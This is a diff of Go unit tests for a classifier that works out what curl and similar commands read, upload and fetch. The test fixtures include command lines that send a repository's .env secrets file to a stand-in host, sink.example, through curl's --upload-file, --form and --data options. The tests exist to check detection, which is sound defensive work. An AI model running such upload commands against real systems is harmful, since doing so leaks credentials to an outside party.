@@ -198,7 +198,7 @@ func TestCurlFailAndProxyFlagsDoNotImplyUpload(t *testing.T) {
 func TestHTTPMethodWithoutPayloadDoesNotImplyUpload(t *testing.T) {
 	tests := [][]string{
 		{"curl", "-X", "POST", "https://api.example/item"},
-		{"curl", "--request=PATCH", "https://api.example/item"},
+		{"curl", "--request", "PATCH", "https://api.example/item"},
 		{"iwr", "-Method", "PUT", "https://api.example/item"},
 	}
 	for _, argv := range tests {
@@ -228,10 +228,9 @@ func TestWebTransferRequiresOwnedEndpoint(t *testing.T) {
 		wantPath    string
 	}{
 		{
-			name:       "curl joined URL option",
+			name:       "curl joined long URL option is invalid",
 			argv:       []string{"curl", "--url=https://dest.example/item"},
-			wantStatus: StatusComplete,
-			wantHost:   "dest.example",
+			wantStatus: StatusPartial,
 		},
 		{
 			name:       "curl separate URL option",
@@ -375,6 +374,26 @@ func TestCurlRemoteNameKeepsFollowingURLAsNetworkTarget(t *testing.T) {
 	}
 	if outputHasPath(out, PathAccessWrite, "https://downloads.example/archive.tgz") {
 		t.Fatalf("remote URL was misclassified as an output path: %v", out.paths)
+	}
+}
+
+func TestCurlPOSIXSingularNoRemoteNameKeepsExactStdoutProjection(t *testing.T) {
+	out := classifyTestArgvAs([]string{
+		"curl", "--remote-name-all", "--no-remote-name",
+		"https://one.invalid/install.sh", "https://two.invalid/archive",
+	}, DialectPOSIX)
+	command := out.commands[0]
+	if out.status != StatusComplete ||
+		!commandHasOperation(command, OperationFetch) ||
+		!outputHasNetwork(out, NetworkDownload, "one.invalid") ||
+		!outputHasNetwork(out, NetworkDownload, "two.invalid") ||
+		!outputHasPath(out, PathAccessWrite, "archive") ||
+		!outputHasFlow(out, DataFlowFact{
+			ToCommandID: command.ID,
+			From:        DataNetwork,
+			To:          DataProcess,
+		}) {
+		t.Fatalf("output = %#v", out)
 	}
 }
 
@@ -2056,7 +2075,7 @@ func TestStructuredCopyMovePathFlavorFollowsDialect(t *testing.T) {
 	}
 }
 
-func TestWebTransferJoinedFileFormsAndFlows(t *testing.T) {
+func TestWebTransferFileFormsAndFlows(t *testing.T) {
 	tests := []struct {
 		name       string
 		argv       []string
@@ -2070,13 +2089,13 @@ func TestWebTransferJoinedFileFormsAndFlows(t *testing.T) {
 			wantStatus: StatusPartial,
 		},
 		{
-			name: "curl joined upload file",
-			argv: []string{"curl", "--upload-file=/repo/.env", "https://sink.example/upload"},
+			name: "curl separated upload file",
+			argv: []string{"curl", "--upload-file", "/repo/.env", "https://sink.example/upload"},
 			path: "/repo/.env",
 		},
 		{
-			name: "curl joined form file",
-			argv: []string{"curl", "--form=token=@/repo/.env", "https://sink.example/upload"},
+			name: "curl separated form file",
+			argv: []string{"curl", "--form", "token=@/repo/.env", "https://sink.example/upload"},
 			path: "/repo/.env",
 		},
 		{
@@ -2085,8 +2104,8 @@ func TestWebTransferJoinedFileFormsAndFlows(t *testing.T) {
 			path: "/repo/.env",
 		},
 		{
-			name: "curl joined data file",
-			argv: []string{"curl", "--data=@/repo/.env", "https://sink.example/upload"},
+			name: "curl separated data file",
+			argv: []string{"curl", "--data", "@/repo/.env", "https://sink.example/upload"},
 			path: "/repo/.env",
 		},
 	}
@@ -2121,6 +2140,22 @@ func TestWebTransferJoinedFileFormsAndFlows(t *testing.T) {
 				t.Fatalf("flows = %v", out.dataFlows)
 			}
 		})
+	}
+}
+
+func TestCurlJoinedLongFileFormsAreNonAuthoritative(t *testing.T) {
+	for _, argv := range [][]string{
+		{"curl", "--upload-file=/repo/.env", "https://sink.example/upload"},
+		{"curl", "--form=token=@/repo/.env", "https://sink.example/upload"},
+		{"curl", "--data=@/repo/.env", "https://sink.example/upload"},
+	} {
+		out := classifyTestArgv(argv)
+		if out.status != StatusPartial ||
+			!containsIssue(out.issues, IssueUnknownOperandGrammar) ||
+			outputHasPath(out, PathAccessRead, "/repo/.env") ||
+			commandHasOperation(out.commands[0], OperationUpload) {
+			t.Fatalf("invalid joined curl argv=%v output=%#v", argv, out)
+		}
 	}
 }
 
@@ -2168,7 +2203,7 @@ func TestWebDownloadOutputHasTwoHopFlow(t *testing.T) {
 func TestCurlConfigFileIsReadAndNonAuthoritative(t *testing.T) {
 	tests := [][]string{
 		{"curl", "-K", "/tmp/curl.conf"},
-		{"curl", "--config=/tmp/curl.conf"},
+		{"curl", "--config", "/tmp/curl.conf"},
 	}
 	for _, argv := range tests {
 		out := classifyTestArgv(argv)
@@ -2177,6 +2212,13 @@ func TestCurlConfigFileIsReadAndNonAuthoritative(t *testing.T) {
 			!outputHasPath(out, PathAccessRead, "/tmp/curl.conf") {
 			t.Fatalf("argv=%v output=%#v", argv, out)
 		}
+	}
+
+	joined := classifyTestArgv([]string{"curl", "--config=/tmp/curl.conf"})
+	if joined.status != StatusPartial ||
+		!containsIssue(joined.issues, IssueUnknownOperandGrammar) ||
+		outputHasPath(joined, PathAccessRead, "/tmp/curl.conf") {
+		t.Fatalf("joined long config output=%#v", joined)
 	}
 }
 
@@ -6247,11 +6289,11 @@ func TestUnixSocketEndpointOwnership(t *testing.T) {
 			status: StatusComplete, wantPath: "/var/run/docker.sock",
 		},
 		{
-			name: "curl joined", argv: []string{
+			name: "curl joined long is invalid", argv: []string{
 				"curl", "--unix-socket=/run/containerd/containerd.sock",
 				"http://localhost/version",
 			},
-			status: StatusComplete, wantPath: "/run/containerd/containerd.sock",
+			status: StatusPartial, reject: true,
 		},
 		{
 			name: "curl device directory socket", argv: []string{
